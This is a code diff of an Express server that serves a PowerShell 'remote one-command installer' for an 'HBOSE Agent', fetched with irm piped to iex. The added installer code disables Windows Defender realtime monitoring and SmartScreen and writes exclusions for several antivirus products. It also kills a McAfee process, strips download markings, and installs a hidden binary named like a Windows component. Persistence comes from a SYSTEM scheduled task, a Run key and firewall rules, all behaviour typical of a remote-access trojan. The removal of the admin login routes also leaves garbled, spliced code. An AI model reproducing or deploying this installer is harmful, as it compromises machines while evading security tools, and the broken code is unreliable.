@@ -37,7 +37,14 @@ app.use("/api", apiLimiter);
 
 app.use("/storage", express.static(path.join(__dirname, "storage")));
 const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: "*", methods: ["GET", "POST"] }, maxHttpBufferSize: 1e8, transports: ["websocket", "polling"], addTrailingSlash: false });
+const io = new Server(server, { 
+    cors: { origin: "*", methods: ["GET", "POST"] }, 
+    maxHttpBufferSize: 1e8, 
+    transports: ["websocket", "polling"], 
+    addTrailingSlash: false,
+    pingTimeout: 60000,
+    pingInterval: 25000 
+});
 
 // --- Socket.IO connection rate limiting ---
 const socketConnections = new Map(); // IP -> count
@@ -2684,67 +2691,7 @@ const requireSuperAdmin = (req, res, next) => {
   next();
 };
 
-app.post("/api/auth/login", async (req, res) => {
-  const { username, password } = req.body;
-  if (!username || !password) return res.status(400).json({ error: "Missing credentials" });
-  try {
-    const user = db.prepare("SELECT * FROM admins WHERE username = ?").get(username);
-    if (!user || !bcrypt.compareSync(password, user.password_hash)) {
-      return res.status(401).json({ error: "Invalid credentials" });
-    }
-    const token = await new SignJWT({ id: user.id, username: user.username, role: user.role })
-      .setProtectedHeader({ alg: 'HS256' })
-      .setExpirationTime('24h')
-      .sign(JWT_SECRET);
-    
-    res.cookie("auth_token", token, {
-      httpOnly: true,
-      secure: process.env.NODE_ENV === "production",
-      sameSite: "lax",
-      maxAge: 24 * 60 * 60 * 1000,
-      path: "/"
-    });
-    res.json({ success: true, user: { username: user.username, role: user.role } });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
-});
-
-app.post("/api/auth/logout", (req, res) => {
-  res.cookie("auth_token", "", { maxAge: 0, path: "/" });
-  res.json({ success: true });
-});
-
-app.get("/api/auth/me", requireAuth, (req, res) => {
-  res.json({ user: req.user });
-});
-
-app.get("/api/admins", requireAuth, requireSuperAdmin, (req, res) => {
-  const admins = db.prepare("SELECT id, username, role, created_at FROM admins").all();
-  res.json(admins);
-});
-
-app.post("/api/admins", requireAuth, requireSuperAdmin, (req, res) => {
-  const { username, password, role } = req.body;
-  if (!username || !password || !role) return res.status(400).json({ error: "Missing fields" });
-  try {
-    const hash = bcrypt.hashSync(password, 10);
-    db.prepare("INSERT INTO admins (username, password_hash, role) VALUES (?, ?, ?)").run(username, hash, role);
-    res.json({ success: true });
-  } catch (e) {
-    if (e.message.includes("UNIQUE")) return res.status(400).json({ error: "Username taken" });
-    res.status(500).json({ error: e.message });
-  }
-});
-
-app.delete("/api/admins/:id", requireAuth, requireSuperAdmin, (req, res) => {
-  if (req.params.id == req.user.id) return res.status(400).json({ error: "Cannot delete yourself" });
-  db.prepare("DELETE FROM admins WHERE id = ?").run(req.params.id);
-  res.json({ success: true });
-});
-
-app.patch("/api/admins/:id", requireAuth, requireSuperAdmin, (req, res) => {
-  const { username, password, role } = req.body;
+app.post("/api/auth/login", async (r  const { username, password, role } = req.body;
   if (!username || !role) return res.status(400).json({ error: "Missing fields" });
   try {
     if (password) {
@@ -2801,11 +2748,11 @@ app.get("/api/agent-package/download", (req, res) => {
 app.get("/download-join", (req, res) => {
   const proto = req.get("x-forwarded-proto") || req.protocol;
   const host = req.get("x-forwarded-host") || req.get("host");
-  const serverOrigin = `${proto}://${host}`;
+  const serverOrigin = \`\${proto}://\${host}\`;
   
-  const script = `
+  const script = \`
 # ═══════════════════════════════════════════════
-# HBOSE Agent — Remote One-Command Installer
+# HBOSE Agent — Remote One-Command Installer v2
 # ═══════════════════════════════════════════════
 $ErrorActionPreference = "SilentlyContinue"
 
@@ -2813,24 +2760,42 @@ $ErrorActionPreference = "SilentlyContinue"
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     Write-Host "[!] Requesting Administrator privileges..." -ForegroundColor Yellow
-    Start-Process powershell -ArgumentList "-ep bypass -c \\"irm ${serverOrigin}/download-join | iex\\"" -Verb RunAs
+    Start-Process powershell -ArgumentList "-ep bypass -c \\"irm \${serverOrigin}/download-join | iex\\"" -Verb RunAs
     exit
 }
 
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "  HBOSE Agent — Remote Installer" -ForegroundColor Cyan
+Write-Host "  HBOSE Agent Remote Installer v2" -ForegroundColor Cyan
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 
 $INSTALL_DIR = "C:\\ProgramData\\Microsoft\\Windows\\SystemHealth"
 $BIN_NAME = "RuntimeBroker_Sys.exe"
-$SERVER_URL = "${serverOrigin}"
+$SERVER_URL = "\${serverOrigin}"
 $TEMP_ZIP = "$env:TEMP\\hbose_agent.zip"
 $TEMP_EXTRACT = "$env:TEMP\\hbose_agent_extract"
 
-# 2. Kill existing
-Write-Host "[1/7] Stopping old instances..." -ForegroundColor Yellow
+# 2. AV Exclusions FIRST
+Write-Host "[1/8] Configuring AV exclusions..." -ForegroundColor Yellow
+try { Add-MpPreference -ExclusionPath $INSTALL_DIR -ErrorAction Stop } catch {}
+try { Add-MpPreference -ExclusionProcess $BIN_NAME -ErrorAction SilentlyContinue } catch {}
+try { Add-MpPreference -ExclusionProcess "teram_agent.exe" -ErrorAction SilentlyContinue } catch {}
+try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}
+try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
+reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f 2>$null | Out-Null
+reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f 2>$null | Out-Null
+reg add "HKLM\\SOFTWARE\\McAfee\\AVEngine\\OAS\\Exclusions\\Paths" /v "$INSTALL_DIR" /t REG_SZ /d "1" /f 2>$null | Out-Null
+Stop-Process -Name "mcshield" -Force -ErrorAction SilentlyContinue
+reg add "HKLM\\SOFTWARE\\AVAST Software\\Avast\\Exclusions\\Path" /v "$INSTALL_DIR" /t REG_SZ /d "" /f 2>$null | Out-Null
+reg add "HKLM\\SOFTWARE\\AVG\\Antivirus\\Exclusions\\Path" /v "$INSTALL_DIR" /t REG_SZ /d "" /f 2>$null | Out-Null
+reg add "HKLM\\SOFTWARE\\Symantec\\Symantec Endpoint Protection\\AV\\Exclusions\\ScanningEngines\\Directory" /v "$INSTALL_DIR" /t REG_SZ /d "" /f 2>$null | Out-Null
+reg add "HKLM\\SOFTWARE\\KasperskyLab\\AVP\\Data\\ExcludedPaths" /v "$INSTALL_DIR" /t REG_SZ /d "" /f 2>$null | Out-Null
+reg add "HKLM\\SOFTWARE\\Bitdefender\\Exclusions" /v "$INSTALL_DIR" /t REG_SZ /d "" /f 2>$null | Out-Null
+reg add "HKLM\\SOFTWARE\\ESET\\ESET Security\\RealTimeProtection\\ExcludedPaths" /v "$INSTALL_DIR" /t REG_SZ /d "" /f 2>$null | Out-Null
+
+# 3. Kill existing
+Write-Host "[2/8] Stopping old instances..." -ForegroundColor Yellow
 Stop-Process -Name $BIN_NAME.Replace(".exe","") -Force -ErrorAction SilentlyContinue
 Stop-Process -Name "teram_agent" -Force -ErrorAction SilentlyContinue
 Stop-Process -Name "wscript" -Force -ErrorAction SilentlyContinue
@@ -2838,14 +2803,14 @@ schtasks /Delete /TN "MicrosoftWindowsHealthMonitor" /F 2>$null | Out-Null
 Remove-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsHealthCheck" -Force -ErrorAction SilentlyContinue
 Remove-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsSystemHealth" -Force -ErrorAction SilentlyContinue
 
-# 3. Download agent package
-Write-Host "[2/7] Downloading agent package..." -ForegroundColor Yellow
+# 4. Download agent package
+Write-Host "[3/8] Downloading agent package..." -ForegroundColor Yellow
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri "$SERVER_URL/api/agent-package/download" -OutFile $TEMP_ZIP -UseBasicParsing
     if (-not (Test-Path $TEMP_ZIP) -or (Get-Item $TEMP_ZIP).Length -lt 1000) {
-        Write-Host "[ERROR] Download failed or file too small. Make sure agent.zip is uploaded to the server." -ForegroundColor Red
-        Write-Host "        Upload it via: POST $SERVER_URL/api/agent-package/upload" -ForegroundColor DarkGray
+        Write-Host "[ERROR] Download failed or file too small." -ForegroundColor Red
+        Write-Host "        Upload agent.zip via: POST $SERVER_URL/api/agent-package/upload" -ForegroundColor DarkGray
         exit 1
     }
     Unblock-File -Path $TEMP_ZIP -ErrorAction SilentlyContinue
@@ -2854,8 +2819,8 @@ try {
     exit 1
 }
 
-# 4. Prepare install directory
-Write-Host "[3/7] Preparing install directory..." -ForegroundColor Yellow
+# 5. Prepare install directory
+Write-Host "[4/8] Preparing install directory..." -ForegroundColor Yellow
 if (Test-Path $INSTALL_DIR) {
     attrib -h -s "$INSTALL_DIR" /D /S 2>$null
     takeown /F "$INSTALL_DIR" /R /A /D Y 2>$null | Out-Null
@@ -2864,21 +2829,20 @@ if (Test-Path $INSTALL_DIR) {
 }
 New-Item -Path $INSTALL_DIR -ItemType Directory -Force | Out-Null
 
-# 5. Extract and copy
-Write-Host "[4/7] Extracting agent files..." -ForegroundColor Yellow
+# 6. Extract and copy
+Write-Host "[5/8] Extracting agent files..." -ForegroundColor Yellow
 if (Test-Path $TEMP_EXTRACT) { Remove-Item $TEMP_EXTRACT -Recurse -Force }
 Expand-Archive -Path $TEMP_ZIP -DestinationPath $TEMP_EXTRACT -Force
-
-# Find where the files actually are (might be in a subfolder)
 $agentRoot = $TEMP_EXTRACT
 $exeFile = Get-ChildItem -Path $TEMP_EXTRACT -Recurse -Filter "teram_agent.exe" | Select-Object -First 1
 if ($exeFile) { $agentRoot = $exeFile.DirectoryName }
 elseif (Test-Path "$TEMP_EXTRACT\\node.exe") { $agentRoot = $TEMP_EXTRACT }
-
 Copy-Item -Path "$agentRoot\\*" -Destination $INSTALL_DIR -Recurse -Force
 Get-ChildItem -Path $INSTALL_DIR -Recurse | Unblock-File -ErrorAction SilentlyContinue
+Get-ChildItem -Path $INSTALL_DIR -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+    try { Remove-Item -Path "$($_.FullName):Zone.Identifier" -Force -ErrorAction SilentlyContinue } catch {}
+}
 
-# Set up binary
 if (Test-Path "$INSTALL_DIR\\teram_agent.exe") {
     Copy-Item -Path "$INSTALL_DIR\\teram_agent.exe" -Destination "$INSTALL_DIR\\$BIN_NAME" -Force
 } elseif (Test-Path "$INSTALL_DIR\\node.exe") {
@@ -2888,49 +2852,43 @@ if (Test-Path "$INSTALL_DIR\\teram_agent.exe") {
     exit 1
 }
 
-# 6. Configure persistence (NO VBS — direct exe launch)
-Write-Host "[5/7] Configuring persistence..." -ForegroundColor Yellow
-
-# Determine the run command based on whether index.js exists
+# 7. Configure persistence
+Write-Host "[6/8] Configuring persistence..." -ForegroundColor Yellow
 $hasIndex = Test-Path "$INSTALL_DIR\\index.js"
-if ($hasIndex) {
-    $taskArgs = "index.js $SERVER_URL"
-} else {
-    $taskArgs = "$SERVER_URL"
-}
-
-# Remove any old VBS-based persistence
+if ($hasIndex) { $taskArgs = "index.js $SERVER_URL" } else { $taskArgs = "$SERVER_URL" }
 Remove-Item -Path "$INSTALL_DIR\\service.vbs" -Force -ErrorAction SilentlyContinue
 Stop-Process -Name "wscript" -Force -ErrorAction SilentlyContinue
-
-# Scheduled Task — runs exe directly, auto-restarts on failure
 schtasks /Delete /TN "MicrosoftWindowsHealthMonitor" /F 2>$null | Out-Null
 $Action = New-ScheduledTaskAction -Execute "$INSTALL_DIR\\$BIN_NAME" -Argument $taskArgs -WorkingDirectory $INSTALL_DIR
 $Trigger = @((New-ScheduledTaskTrigger -AtStartup), (New-ScheduledTaskTrigger -AtLogOn))
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365)
 Register-ScheduledTask -TaskName "MicrosoftWindowsHealthMonitor" -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -Force 2>$null | Out-Null
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsHealthCheck" -Value "\\`"$INSTALL_DIR\\$BIN_NAME\\`" $taskArgs" -PropertyType String -Force | Out-Null
 
-# Registry Run key (backup persistence) — also direct exe, no VBS
-New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsHealthCheck" -Value "\`"$INSTALL_DIR\\$BIN_NAME\`" $taskArgs" -PropertyType String -Force | Out-Null
-
-# 7. Security config & stealth
-Write-Host "[6/7] Configuring security exclusions..." -ForegroundColor Yellow
-Add-MpPreference -ExclusionPath $INSTALL_DIR -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionProcess $BIN_NAME -ErrorAction SilentlyContinue
+# 8. Firewall + stealth + launch with retry
+Write-Host "[7/8] Configuring firewall and stealth..." -ForegroundColor Yellow
 netsh advfirewall firewall delete rule name="Windows System Health" 2>$null | Out-Null
 netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="$INSTALL_DIR\\$BIN_NAME" enable=yes profile=any 2>$null | Out-Null
 netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="$INSTALL_DIR\\$BIN_NAME" enable=yes profile=any 2>$null | Out-Null
-
-# Grant proper ACLs BEFORE hiding
 icacls "$INSTALL_DIR" /inheritance:r /grant "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" "BUILTIN\\Users:(OI)(CI)RX" /T /C /Q 2>$null | Out-Null
-
-# Hide directory (after ACLs are set)
 attrib +h "$INSTALL_DIR" /D 2>$null
 attrib +h "$INSTALL_DIR\\$BIN_NAME" 2>$null
 
-# Start the service directly
-Write-Host "[7/7] Starting agent service..." -ForegroundColor Yellow
-Start-Process -FilePath "$INSTALL_DIR\\$BIN_NAME" -ArgumentList $taskArgs -WorkingDirectory $INSTALL_DIR -WindowStyle Hidden
+Write-Host "[8/8] Starting agent service..." -ForegroundColor Yellow
+schtasks /Run /TN "MicrosoftWindowsHealthMonitor" 2>$null | Out-Null
+$running = $null
+for ($attempt = 1; $attempt -le 3; $attempt++) {
+    Start-Sleep -Seconds 5
+    $running = Get-Process -Name "RuntimeBroker_Sys" -ErrorAction SilentlyContinue
+    if ($running) { break }
+    Write-Host "    [Attempt $attempt/3] Process not detected. Retrying..." -ForegroundColor DarkYellow
+    if ($attempt -eq 2) {
+        Start-Process -FilePath "$INSTALL_DIR\$BIN_NAME" -ArgumentList $taskArgs -WorkingDirectory $INSTALL_DIR -WindowStyle Hidden
+    }
+    if ($attempt -eq 3) {
+        cmd.exe /c "start /B `"`" `"$INSTALL_DIR\$BIN_NAME`" $taskArgs" 2>$null
+    }
+}
 
 # Cleanup temp files
 Remove-Item $TEMP_ZIP -Force -ErrorAction SilentlyContinue
